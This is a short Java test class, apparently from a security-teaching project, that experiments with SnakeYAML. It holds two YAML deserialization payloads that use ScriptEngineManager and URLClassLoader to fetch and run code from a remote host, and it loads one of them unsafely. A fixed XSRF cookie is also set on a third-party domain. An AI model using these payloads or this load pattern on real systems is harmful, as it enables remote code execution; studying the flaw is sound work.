package org.joychou.controller;

import org.joychou.dao.User;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.yaml.snakeyaml.Yaml;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@Controller
@RequestMapping("/test")
public class Test {

    @RequestMapping(value = "/")
    @ResponseBody
    private String Index(HttpServletResponse response, String empId) {

        System.out.println(empId);
        Cookie cookie = new Cookie("XSRF-TOKEN", "123");
        cookie.setDomain("taobao.com");
        cookie.setMaxAge(-1); // forever time
        response.addCookie(cookie);
        return "success";
    }


    public static void main(String[] args){
        User user = new User();
        user.setUsername("shadowsock5");
        Yaml yaml = new Yaml();
        String s = yaml.dump(user);
        System.out.println(s);
        User u = yaml.load(s);
        System.out.println(u + ":" + user.getUsername());

        String paylaod = "!!javax.script.ScriptEngineManager  [!!java.net.URLClassLoader  [[!!java.net.URL  [\"http://192.168.85.1:8080/\"]]]]";
        String paylaod2= "!!javax.script.ScriptEngineManager  [!!java.net.URLClassLoader  [[!!java.net.URL  [\"http://127.0.0.1:8080/\"]]]]";

        new Yaml().load(paylaod2);
    }

}
